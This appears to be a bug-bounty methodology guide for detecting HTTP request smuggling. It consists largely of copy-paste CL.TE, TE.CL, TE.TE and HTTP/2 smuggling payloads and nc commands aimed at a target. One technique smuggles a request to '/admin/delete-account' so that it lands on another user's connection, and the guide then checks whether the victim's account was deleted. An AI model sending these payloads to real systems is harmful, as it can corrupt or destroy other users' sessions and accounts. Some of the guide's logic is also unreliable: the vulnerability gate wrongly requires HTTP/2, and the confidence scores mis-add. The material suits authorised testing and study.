# Detection Techniques - Methodology untuk Zero False Positives

## Detection Strategy Overview

Request smuggling detection requires **3 layers of confirmation:**

1. **Layer 1: Behavioral Indicators** (high-speed filtering)
2. **Layer 2: Timing Attacks** (statistical analysis)
3. **Layer 3: Socket Poisoning Confirmation** (definitive proof)

**Each layer eliminates false positives from previous layer.**

---

## Layer 1: Quick Behavioral Filters

### Quick Checks (Do FIRST)

```
[✓] Target has reverse proxy/CDN/load balancer
    - Check headers: X-Forwarded-For, Via, X-Forwarded-Proto
    - Check response timing inconsistencies
    - Check repeated requests return different results (cache behavior)

[✓] Connection reuse is enabled
    - Send multiple requests on same connection
    - Observe if state persists between requests
    - Check Keep-Alive header

[✓] HTTP/2 is available
    - Use tools: `curl -I --http2 https://target.com`
    - Check ALPN support
    - Observe if frontend/backend versions differ
```

If ANY of above fail → NOT VULNERABLE to request smuggling
If ALL pass → Continue to Layer 2

---

## Layer 2: Timing-Based Detection

### CL.TE Detection (Most Common)

**Principle:** Frontend sends all data. Backend waits for chunk terminator.

**Setup:**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

1
A
X
```

**Expected Backend Behavior:**
- Reads CL=4 bytes: "1\nA\n" (or similar parsing)
- Expects more data (chunk not terminated)
- Waits for chunk terminator → **TIMEOUT**

**Execution:**
```bash
# Method 1: Direct timeout observation
timeout 5 nc target.com 80 << 'EOF'
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

1
A
X
EOF
# Result: Connection hangs (VULNERABLE)
```

**Timing Threshold:**
```
Normal request: 200-500ms
CL.TE vulnerable: 5000-30000ms (timeout waiting)
Connection timeout: >60000ms (server gives up)
False positive: 200-500ms (no delay)
```

**Confidence Score:** 
- 5+ second delay = 95% confidence
- Also test with normal payload (baseline comparison)

---

### TE.CL Detection

**Principle:** Frontend terminates chunks. Backend expects more bytes.

**Setup:**
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 6
Connection: keep-alive

0

X
```

**Expected Backend Behavior:**
- Sees "0\r\n\r\n" → chunk stream ends
- But CL=6, only received 5 bytes so far
- Waits for more data → **TIMEOUT**

**Execution:**
```bash
timeout 5 nc target.com 80 << 'EOF'
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 6
Connection: keep-alive

0

X
EOF
# Result: Connection hangs (VULNERABLE)
```

**Timing Threshold:** Same as CL.TE (5+ seconds = vulnerable)

---

### TE.TE Detection (Obfuscation Variants)

Test multiple obfuscation techniques sequentially:

```
Variant 1: Transfer-Encoding: xchunked
Variant 2: Transfer-Encoding:[space]chunked
Variant 3: Transfer-Encoding:[tab]chunked
Variant 4: Transfer-Encoding\r\n : chunked
Variant 5: Multiple TE headers (conflicting)
Variant 6: Transfer-Encoding: chunked, gzip
```

**For each variant:**
- Frontend may ignore (passes through)
- Backend may ignore (interprets differently)
- Result: parser disagreement

**Detection:** Same timing methodology + differential responses

---

## Layer 3: Differential Response Confirmation

### Socket Poisoning Verification

**Goal:** Prove that smuggled request reaches backend.

**Technique 1: 404 Response Injection**

```
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

1
A
0

GET /nonexistent-page-xyz HTTP/1.1
Host: target.com
Connection: close

```

**Expected Result:**
```
Response 1: 200 OK (to POST /)
[HANG - backend waiting for chunk terminator or more data]

Then send 2nd request (victim):
GET / HTTP/1.1
Host: target.com

Expected Response: 404 (to our smuggled GET /nonexistent-page-xyz)
Actual Response: [victim's normal GET / response]
```

**Interpretation:**
- 404 received = VULNERABLE (smuggled request processed)
- Normal response = NOT VULNERABLE (smuggled request ignored)
- Timeout = Likely vulnerable but needs Layer 2 timing confirmation

---

**Technique 2: Method Confusion Injection**

```
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

0

POST /admin/delete-account HTTP/1.1
Host: target.com
Content-Length: 0
Connection: close

```

**Then send victim request:**
```
GET / HTTP/1.1
Host: target.com
```

**Verification:**
- Check if account was actually deleted
- Check backend logs
- Check if victim was affected (not your session)

---

### Differential Response Analysis

```
METRIC 1: Response Time Differences
- Normal POST /: 150ms
- CL.TE POST /: 5000ms (WAIT)
- Then next GET /: 150ms

METRIC 2: Response Headers
- Normal: Content-Length, Cache-Control, Server
- CL.TE first response: Same
- Victim response: Different (got 404 from smuggle)

METRIC 3: Content Analysis
- Look for internal headers in response (leakage)
- Check if response is from different backend instance
- Verify timing correlations
```

---

## HTTP/2 Detection (H2.CL / H2.TE)

### ALPN Negotiation Check

```bash
# Check what protocols supported
openssl s_client -connect target.com:443 -alpn h2,http/1.1

# Expected output shows:
# - ALPN, server accepted: h2 (or http/1.1)
# - This reveals frontend version
```

### H2.CL Detection

**Setup (requires HTTP/2 aware tool):**

```
HTTP/2 Request:
:method: POST
:path: /
:scheme: https
:authority: target.com
content-length: 13

Hello, World!SMUGGLED_STUFF
```

**Backend sees (HTTP/1.1):**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13

Hello, World!   <- Only 13 bytes read
SMUGGLED_STUFF  <- Prefix of next request
```

**Confirmation:**
- Send above H2 request
- Immediately send normal request
- Check if normal request gets error/corruption

---

## Automated Detection Workflow

```
┌─ Layer 1: Quick Filters
│  ├─ Check reverse proxy indicators
│  ├─ Check connection reuse
│  └─ Check HTTP/2 support
│
└─ Pass? Continue to Layer 2
   │
   ├─ CL.TE Timing Test (5 second wait)
   ├─ TE.CL Timing Test (5 second wait)
   ├─ TE.TE Obfuscation Tests (3+ variants)
   └─ H2 Tests (if HTTP/2 detected)
   
   └─ Any timeout >5 seconds? Continue to Layer 3
      │
      ├─ 404 Injection Test
      ├─ Method Injection Test
      └─ Header Leakage Test
      
      └─ Confirmed socket poisoning? 
         YES → VULNERABLE (proceed to exploitation)
         NO → FALSE POSITIVE (safe to skip)
```

---

## False Positive Elimination

### Common False Positives

| Indicator | Actually False | How to Verify |
|-----------|----------------|---------------|
| 5s timeout | Could be network latency | Baseline: test with normal GET request timing |
| Weird response | Could be WAF | Check for common WAF signatures |
| 404 response | Could be CMS catching requests | Test with known endpoint + parameter |
| Header leakage | Could be normal behavior | Compare with unauthenticated request |
| Cache behavior | Could be intended | Check Cache-Control headers |

### Confidence Scoring Matrix

```
LAYER 1 PASS:     +20 points
LAYER 2 TIMING:   +30 points (5s+ delay)
LAYER 3 SOCKET:   +50 points (confirmed injection)
TOTAL CONFIDENCE: 
  < 50 points: LOW (skip)
  50-75 points: MEDIUM (investigate further)
  > 75 points: HIGH (proceed to exploitation)
```

### Minimum Viable Proof

For bounty submission, require AT MINIMUM:
1. Layer 1 + Layer 2 timing (75 points) = Medium confidence
2. Layer 1 + Layer 2 + Layer 3 socket (100 points) = Definitive proof

**Never** submit based on Layer 1 alone.

---

## Quick Reference: Detection Payloads

### CL.TE (Copy-Paste Ready)

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

1
A
X
```

### TE.CL (Copy-Paste Ready)

```
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Content-Length: 6
Connection: keep-alive

0

X
```

### TE.TE Variant 1 (Copy-Paste Ready)

```
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Connection: keep-alive

0

X
```

### Differential Response Test (Copy-Paste Ready)

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

1
A
0

GET /does-not-exist HTTP/1.1
Host: TARGET

```

Then check next request's response for 404 error.

